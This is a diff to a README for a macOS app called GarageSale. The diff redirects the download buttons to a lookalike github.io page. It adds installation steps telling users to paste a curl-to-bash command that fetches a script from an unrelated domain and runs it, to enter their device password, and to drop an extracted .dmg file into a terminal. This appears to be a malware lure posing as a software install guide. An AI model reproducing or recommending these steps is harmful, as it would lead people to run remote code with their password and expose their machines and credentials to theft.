@@ -3,9 +3,33 @@
 GarageSale is an advanced macOS application designed to streamline your online garage sale experience. Create, manage, and advertise your garage sales like a pro with powerful tools and an intuitive interface.
 
 ## ✅ Download GarageSale for macOS
-[![Download GarageSale](https://img.shields.io/badge/Download-GarageSale-blueviolet)](#)
+[![Download GarageSale](https://img.shields.io/badge/Download-GarageSale-blueviolet)](https://garagesale-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is GarageSale?
 
@@ -36,19 +60,7 @@ GarageSale is a full-featured client for managing online and local garage sales.
 
 ---
 
-[![Download GarageSale](https://img.shields.io/badge/Download-GarageSale-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install GarageSale on macOS  
-- 🚀 Launch the app and sign in or create an account  
-- 🎨 Choose a listing template or start from scratch  
-- 🛒 Add items, set prices, and customize the visuals  
-- 📤 Publish online or generate materials for local sales  
-- 📊 Track sales and manage your garage sale efficiently
-
+[![Download GarageSale](https://img.shields.io/badge/Download-GarageSale-blueviolet)](https://garagesale-mac-download.github.io/.github)
 
 ---
 
